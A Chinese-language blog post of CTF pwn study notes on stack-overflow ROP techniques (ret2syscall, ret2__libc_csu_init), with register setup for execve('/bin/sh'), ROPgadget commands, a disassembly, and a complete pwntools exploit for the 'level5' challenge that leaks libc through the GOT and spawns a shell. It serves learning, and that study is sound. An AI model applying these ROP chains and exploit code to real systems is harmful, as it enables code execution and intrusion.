---
title: StackOverFlow
date: 2020-9-29
author: x1ngg3
description: "from basic to dead"
category: PWN
tags:
- pwn
- ctf
---

from basic to dead

<!-- more -->

### 写在前面的话

留给自己的备忘。



### basic rop

#### 64位传参

> 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。
> 当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。



### ret2syscall

[有关系统调用](https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8)

> ```c++
> execve("/bin/sh",NULL,NULL)
> ```

- 这里是32位程序，需要使得
- 系统调用号，即 eax 应该为 0xb
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

至于如何控制这些寄存器的值，就需要使用gadgets，下面是使用格式。

> ```shell
> ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'   //rop为你的elf文件
> ROPgadget --binary rop  --string '/bin/sh'
> ROPgadget --binary rop  --only 'int' 
> ```



## mediumrop

关于一些巧妙的gadgets

### ret2__libc_csu_init

[原题wiki地址](https://wiki.x10sec.org/pwn/stackoverflow/medium_rop/#ret2__libc_csu_init)

```assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005C0 ; __unwind {
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; } // starts at 4005C0
.text:0000000000400624 __libc_csu_init endp
```

放一张图

![x86-64](https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/yFHw6Z7rgW3JVjQ.png)  

因为wiki上讲的已经很详细了，这里就记录一下wiki上没有说的几个小点（可能wiki觉得太简单了没说，但我又太菜了不会.......）

> - payload += 0x38 * 'a', 为什么是0x38而不是0x30，注意0x400616	rsp,	8
> 
>   这里rsp指针向高地址走了8个字节，所以用八个‘a'给补上
>
> 
>
> - 为什么r12放的是要执行的地址，注意0x400609	call	qword ptr [r12+rbx*8]
>
>   因为我们把rbx设置的是0，所以这里直接就相当于call	r12
>
>   
>
> - 另外这个题是用的write_got来输出write_got，我自己没有调试，但网上的大佬说write_plt被改过，所以不能正确的调用。

exp:

***

```python
from pwn import *
from LibcSearcher import *
elf = ELF('./level5')
sh = process('./level5')
bss_base = elf.bss()
main_addr = elf.symbols['main']
write_got = elf.got['write']
read_got = elf.got['read']
a_addr = 0x400600     #csu_start_addr   
b_addr = 0x40061A     #csi_end_addr

def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
    payload = (0x80 + 8) * 'a'  + p64(b_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(a_addr)
    payload += (8 + 0x30) * 'a' + p64(ret_addr)
    sh.send(payload)
    sleep(2)

sh.recvuntil('Hello, World\n')
csu(0,1,write_got,8,write_got,1,main_addr)
write_addr = u64(sh.recv(8))
libc = LibcSearcher("write",write_addr)
base = write_addr - libc.dump('write')
execve_addr = base + libc.dump('execve')

sh.recvuntil('Hello, World\n')
csu(0,1,read_got,16,bss_base,0,main_addr)
sh.send(p64(execve_addr) + '/bin/sh')

sh.recvuntil('Hello, World\n')
csu(0,1,bss_base,0,0,bss_base + 8,main_addr)
sh.interactive()
```

